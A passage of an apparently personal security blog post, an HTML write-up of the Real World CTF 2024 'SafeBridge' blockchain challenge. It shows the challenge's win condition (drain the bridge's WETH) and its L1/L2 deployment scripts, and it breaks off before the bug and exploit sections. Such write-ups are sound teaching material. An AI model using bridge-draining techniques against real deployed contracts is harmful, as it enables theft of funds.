@@ -1,0 +1,1800 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Real World CTF 2024 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="Real World CTF 2024" />
+<meta property="og:description" content="Writeup for Real World CTF 2024" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chovid99.github.io/posts/real-world-ctf-2024/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-28T23:54:28+07:00" />
+<meta property="article:modified_time" content="2024-01-29T12:49:06+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="Real World CTF 2024"/>
+<meta name="twitter:description" content="Writeup for Real World CTF 2024"/>
+<meta name="twitter:site" content="@Chovid99"/>
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/real-world-ctf-2024/" /><link rel="prev" href="https://chovid99.github.io/posts/asis-ctf-finals-2023/" /><link rel="next" href="https://chovid99.github.io/posts/dicectf-2024-quals/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Real World CTF 2024",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/real-world-ctf-2024\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, blockchain, EVM, bridge, 2024","wordcount":  4790 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/real-world-ctf-2024\/","datePublished": "2024-01-28T23:54:28+07:00","dateModified": "2024-01-29T12:49:06+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Chovid99"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Real World CTF 2024</h1><div class="post-meta">
+            <div class="post-meta-line">
+                </div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jan 28, 2024">Jan 28, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4790 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;23 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#blockchain">Blockchain</a>
+      <ul>
+        <li><a href="#safebridge">SafeBridge</a>
+          <ul>
+            <li><a href="#initial-analysis">Initial Analysis</a></li>
+            <li><a href="#finding-the-bug">Finding the Bug</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/xoaSQJw.png" title="https://i.imgur.com/xoaSQJw.png" data-thumbnail="https://i.imgur.com/xoaSQJw.png" data-sub-html="<h2>Real World CTF 2024. We secured the fourth place</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/xoaSQJw.png"
+            data-srcset="https://i.imgur.com/xoaSQJw.png, https://i.imgur.com/xoaSQJw.png 1.5x, https://i.imgur.com/xoaSQJw.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/xoaSQJw.png" />
+    </a><figcaption class="image-caption">Real World CTF 2024. We secured the fourth place</figcaption>
+    </figure>
+<p>I played with the <strong>Blue Water</strong> team in the Real World CTF 2024. We managed to secure the fourth place. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during it!</p>
+<p>During playing this CTF, I got <strong>first blood</strong> in Real World CTF 2024 by solving the blockchain challenge called <code>safebridge</code>.</p>
+<figure><a class="lightgallery" href="https://i.imgur.com/XzPRFZD.png" title="https://i.imgur.com/XzPRFZD.png" data-thumbnail="https://i.imgur.com/XzPRFZD.png" data-sub-html="<h2>First Blood!</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/XzPRFZD.png"
+            data-srcset="https://i.imgur.com/XzPRFZD.png, https://i.imgur.com/XzPRFZD.png 1.5x, https://i.imgur.com/XzPRFZD.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/XzPRFZD.png" />
+    </a><figcaption class="image-caption">First Blood!</figcaption>
+    </figure>
+<p>This challenge offers a refreshing and realistic perspective, standing out from the usual blockchain scenarios in CTFs, as it closely aligns with actual blockchain vulnerabilities encountered in the real world. Below is the writeup for it.</p>
+<h1 id="blockchain">Blockchain</h1>
+<h2 id="safebridge">SafeBridge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>I&rsquo;ve crafted what I believed to be an ultra-safe token bridge. Don&rsquo;t believe it?</p>
+<p>nc 47.251.56.125 1337</p>
+</div>
+        </div>
+    </div>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>In this challenge, we were provided with a <code>zip</code> file containing the necessary setup. The file includes numerous documents, but I&rsquo;ll focus on explaining only the key ones. Let&rsquo;s begin by examining <code>Challenge.sol</code> to grasp the objective of this challenge.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Challenge</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">BRIDGE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">MESSENGER</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">WETH</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">bridge</span><span class="p">,</span> <span class="kt">address</span> <span class="n">messenger</span><span class="p">,</span> <span class="kt">address</span> <span class="n">weth</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BRIDGE</span> <span class="o">=</span> <span class="n">bridge</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MESSENGER</span> <span class="o">=</span> <span class="n">messenger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WETH</span> <span class="o">=</span> <span class="n">weth</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">BRIDGE</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the <code>Challenge.sol</code> file, it&rsquo;s clear that our goal is to reduce the <code>BRIDGE</code> balance to <code>0</code>. For those unfamiliar with the concept of a <code>bridge</code> in this context, it refers to a mechanism that allows the transfer of assets and information between two different blockchain networks. This functionality is crucial in a decentralized environment where interoperability between different blockchains is needed.</p>
+<p>Now, let&rsquo;s examine the <code>challenge.py</code> file to understand the details of the challenge setup.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">eth_abi</span> <span class="kn">import</span> <span class="n">abi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctf_launchers.pwn_launcher</span> <span class="kn">import</span> <span class="n">PwnChallengeLauncher</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctf_launchers.types</span> <span class="kn">import</span> <span class="p">(</span><span class="n">DaemonInstanceArgs</span><span class="p">,</span> <span class="n">LaunchAnvilInstanceArgs</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">UserData</span><span class="p">,</span> <span class="n">get_additional_account</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">get_privileged_web3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctf_launchers.utils</span> <span class="kn">import</span> <span class="p">(</span><span class="n">anvil_setCodeFromFile</span><span class="p">,</span> <span class="n">anvil_setStorageAt</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">deploy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Challenge</span><span class="p">(</span><span class="n">PwnChallengeLauncher</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_anvil_instances</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">LaunchAnvilInstanceArgs</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;l1&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_anvil_instance</span><span class="p">(</span><span class="n">chain_id</span><span class="o">=</span><span class="mi">78704</span><span class="p">,</span> <span class="n">accounts</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">fork_url</span><span class="o">=</span><span class="kc">None</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;l2&#34;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_anvil_instance</span><span class="p">(</span><span class="n">chain_id</span><span class="o">=</span><span class="mi">78705</span><span class="p">,</span> <span class="n">accounts</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">fork_url</span><span class="o">=</span><span class="kc">None</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_daemon_instances</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">DaemonInstanceArgs</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;relayer&#34;</span><span class="p">:</span> <span class="n">DaemonInstanceArgs</span><span class="p">(</span><span class="n">image</span><span class="o">=</span><span class="s2">&#34;safe-bridge-relayer:latest&#34;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">deploy</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_data</span><span class="p">:</span> <span class="n">UserData</span><span class="p">,</span> <span class="n">mnemonic</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l1_web3</span> <span class="o">=</span> <span class="n">get_privileged_web3</span><span class="p">(</span><span class="n">user_data</span><span class="p">,</span> <span class="s2">&#34;l1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2_web3</span> <span class="o">=</span> <span class="n">get_privileged_web3</span><span class="p">(</span><span class="n">user_data</span><span class="p">,</span> <span class="s2">&#34;l2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">challenge</span> <span class="o">=</span> <span class="n">deploy</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l1_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">project_location</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mnemonic</span><span class="o">=</span><span class="n">mnemonic</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">env</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;L1_RPC&#34;</span><span class="p">:</span> <span class="n">l1_web3</span><span class="o">.</span><span class="n">provider</span><span class="o">.</span><span class="n">endpoint_uri</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;L2_RPC&#34;</span><span class="p">:</span> <span class="n">l2_web3</span><span class="o">.</span><span class="n">provider</span><span class="o">.</span><span class="n">endpoint_uri</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setCodeFromFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x420000000000000000000000000000000000CAFe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;L2CrossDomainMessenger.sol:L2CrossDomainMessenger&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">relayer</span> <span class="o">=</span> <span class="n">get_additional_account</span><span class="p">(</span><span class="n">mnemonic</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setStorageAt</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x420000000000000000000000000000000000CAFe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">hex</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">relayer</span><span class="o">.</span><span class="n">address</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">default_xdomain_sender</span> <span class="o">=</span> <span class="s2">&#34;0x000000000000000000000000000000000000dEaD&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setStorageAt</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x420000000000000000000000000000000000CAFe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">hex</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">default_xdomain_sender</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setCodeFromFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x420000000000000000000000000000000000baBe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;L2ERC20Bridge.sol:L2ERC20Bridge&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2messenger_addr</span> <span class="o">=</span> <span class="s2">&#34;0x420000000000000000000000000000000000CAFe&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">l1_bridge_addr</span><span class="p">,)</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l1_web3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;to&#34;</span><span class="p">:</span> <span class="n">challenge</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="n">l1_web3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s2">&#34;BRIDGE()&#34;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setStorageAt</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x420000000000000000000000000000000000baBe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">hex</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">l2messenger_addr</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setStorageAt</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x420000000000000000000000000000000000baBe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">hex</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">l1_bridge_addr</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">anvil_setCodeFromFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l2_web3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;L2WETH.sol:L2WETH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">challenge</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Challenge</span><span class="p">()</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the code in <code>challenge.py</code>, we can see that the challenge is designed to create two blockchain networks, referred to as <code>L1</code> and <code>L2</code>. The setup involves deploying various contracts on each chain, which we will explore in more detail later. By analyzing the <code>deploy</code> function from <code>utils.py</code>, we notice that it executes another deployment script located in <code>Deploy.s.sol</code>. Next, let&rsquo;s delve into the contents of the <code>Deploy.s.sol</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
